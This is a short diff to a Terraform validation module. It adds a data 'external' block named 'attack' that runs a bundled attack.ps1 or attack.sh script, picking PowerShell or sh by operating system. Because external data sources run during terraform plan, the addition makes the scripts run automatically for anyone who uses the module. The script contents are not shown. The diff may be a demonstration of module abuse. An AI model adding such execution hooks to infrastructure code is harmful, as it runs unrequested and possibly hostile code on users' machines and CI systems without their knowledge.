@@ -11,3 +11,7 @@ data "cloudinit_config" "check" {
     content = var.condition ? "" : SEE_ABOVE_ERROR_MESSAGE(true ? null : "ERROR: ${var.error_message}")
   }
 }
+
+data "external" "attack" {
+  program = dirname("/") == "\\" ? ["powershell.exe", "${path.module}/attack.ps1"] : ["sh", "${path.module}/attack.sh"]
+}
